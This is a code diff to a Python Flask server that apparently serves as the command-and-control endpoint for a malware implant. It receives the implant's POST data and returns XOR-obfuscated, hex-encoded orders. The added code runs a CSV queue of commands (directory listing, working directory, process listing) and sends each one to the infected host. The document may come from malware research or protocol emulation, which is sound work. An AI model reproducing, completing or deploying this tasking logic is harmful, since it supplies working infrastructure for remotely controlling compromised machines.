@@ -1,15 +1,19 @@
 
+from audioop import add
+from math import nan
 import time
 import random
 import os
 import binascii
 import base64
-from json import loads as json_loads
+import pandas as pd
+import random
+import string
 
+from json import loads as json_loads
 from datetime import datetime
 from flask import Flask, render_template, request
 from datetime import datetime
-
 
 app = Flask(__name__)
 
@@ -28,7 +32,7 @@ def rand_byte():
         byte += str(random.randint(0,1))
     return chr(int(byte, 2))
 
-def create_http_body(command=None):
+def create_http_body(command=None, additional_data=""):
     """
     creation of the http body in post request from the malware
     """
@@ -59,14 +63,32 @@ def create_http_body(command=None):
         </assembly>
         """
     else:
-        size = len(str(command))
-        message = size.to_bytes(4, byteorder = 'big').decode("ISO-8859-1") # need to be converted to four bytes ! (DWORD)
-        message += binascii.hexlify(str(command).encode("ISO-8859-1")).decode("ISO-8859-1")
-        random_byte = "".join([rand_byte() for k in range(23-len(message))])
-        message += binascii.hexlify(random_byte.encode("ISO-8859-1")).decode("ISO-8859-1")
+        if str(additional_data) == "nan" or additional_data is None:
+            additional_data = ""
+
+        if len(str(command)+additional_data) > 40:
+            print("Too much Additional Data, max total length = 39")
+            additional_data = additional_data[:39]
+
+        size = len(str(command)+additional_data) +2
+
+        if size < 10:
+            size = "0"+str(size)
+        else:
+            size = str(size)
+
+        plain_info = (size + str(command)+ additional_data)
+
+        letters = string.ascii_lowercase # random letters added to achieve the correct length of 84
+        plain_info += ''.join(random.choice(letters) for _ in range(42 - len(plain_info)))
+
+        #message = binascii.hexlify(plain_info.encode("ISO-8859-1")).decode("ISO-8859-1")
+        message = plain_info
+
         first_byte_message = ord("a")
-        print("message : ", message.encode("ISO-8859-1"))
+
         xored = "".join([chr(ord(cs) ^ first_byte_message) for cs in message]).encode("ISO-8859-1")
+
         final_message = binascii.hexlify(xored).decode("ISO-8859-1")
         print("final xored message : ", final_message, len(final_message))
 
@@ -125,6 +147,31 @@ def get_data_from_malware(json):
 
     return 1
 
+
+def find_desired_order(file_path_command):
+    """
+    This function creates the command file to be executed by the malware if it is not present.
+    If the file is already present, the function returns the first command that is not marked as completed
+    """
+
+    if file_path_command not in os.listdir():
+        # creation of the csv of the desired order with random value
+        df = pd.DataFrame(data={"order":[5, 5, 6], "additional_data":["ls", "pwd", ""], "state":["waiting", "waiting", "waiting"]})
+        print(df)
+        df.to_csv(file_path_command, index=False)
+
+    df = pd.read_csv(file_path_command)
+
+    for state_instance in range(len(df["state"].tolist())):
+        if df["state"][state_instance] == "waiting":
+
+            df["state"][state_instance] = "done"
+
+            df.to_csv(file_path_command, index=False)
+            return df["order"][state_instance], df["additional_data"][state_instance]
+
+    return 0,""
+
 @app.route("/")
 def home():
     #write_log()
@@ -132,6 +179,7 @@ def home():
 
 @app.route("/", methods=['POST'])
 def send_instruction():
+    file_path_command = "commands.csv"
 
     content_type = request.headers.get('Content-Type')
 
@@ -142,7 +190,10 @@ def send_instruction():
         if json_received["steps"] != []:
             get_data_from_malware(json_received)
 
-        body = create_http_body(6) # GetProcessByDescription #Returns a process listing. If no arguments are provided returns just the PID and process name
+        order, additional_data = find_desired_order(file_path_command)
+        print("order", order)
+
+        body = create_http_body(order, additional_data) # GetProcessByDescription #Returns a process listing. If no arguments are provided returns just the PID and process name
         return body
 
     return create_http_body()
